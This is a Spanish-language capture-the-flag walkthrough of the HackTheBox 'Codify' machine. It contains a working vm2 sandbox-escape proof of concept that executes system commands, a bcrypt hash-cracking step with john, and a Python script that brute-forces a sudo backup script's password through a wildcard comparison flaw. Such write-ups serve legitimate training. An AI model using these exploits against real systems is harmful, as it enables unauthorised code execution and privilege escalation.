agregar el host de la pagina en 

```bash
echo "10.10.14.239 codify.htb" | sudo tee -a /etc/hosts
```
Scanear los puertos abiertos con nmap

```bash
nmap -sV -A 10.10.11.239
```
![[Pasted image 20231227160801.png]]

hacerle una auditoria a la pagina
![[Pasted image 20231227160125.png]]
![[Pasted image 20231227160218.png]]
sabemos qe trabaja con sandbox y la version de vm2 es la 3.9.16

buscamos el exploit en google
```
sandbox exploit "github"
```

![[Pasted image 20231227160455.png]]

se nos entrega el siguiente POC

```js
const {VM} = require("vm2");
const vm = new VM();

const code = `
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};
  
const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync('ls -aL');
}
`

console.log(vm.run(code));
```

ya que trabaja con apache veremos que interesante presenta la ruta del programa
![[Pasted image 20231227161010.png]]
la unica carpeta con algo util fue contact la que presenta una base de datos llamada tickets.db
![[Pasted image 20231227161102.png]]
lo mostramos con cat donde encontramos el usuario y contraseña cifrado
![[Pasted image 20231227161254.png]]
utilizamos john the ripper para decifrar la constraseña
```bash
john --format=bcrypt hash.txt
```
una vez desencripte la contraseña nos conectaremos via ssh
```bash
ssh joshua@10.10.11.239
```
![[Pasted image 20231227162050.png]]

**la bandera de user ya la tenemos ahora tenemos que hacer una escala de privilegios hasta el usuario root**

vemos que puede ejecutar el usuario de joshua
![[Pasted image 20231227162252.png]]
mostramos el archivo /opt/scripts/mysql-backup.sh
![[Pasted image 20231227162607.png]]
el codigo tiene un pequeño fallo en el if ya que compara caracter por caracter lo que nos permite hacer un ataque de fuerza bruta
![[Pasted image 20231227162710.png]]
escribimos el siguente comando y copiamos el script en pyhton dentro 
> nano exploit.py 

```python
import string
import subprocess

all = list(string.ascii_letters + string.digits)

password = ""
found = False

while not found:
    for character in all:
        command = f"echo '{password}{character}*' | sudo /opt/scripts/mysql-backup.sh"
        output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True).stdout

        if "Password confirmed!" in output:
            password += character
            print(password)
            break
    else:
        found = True

```
lo ejecutamos y tendremos en unos minutos el acceso admin y la bandera de admin
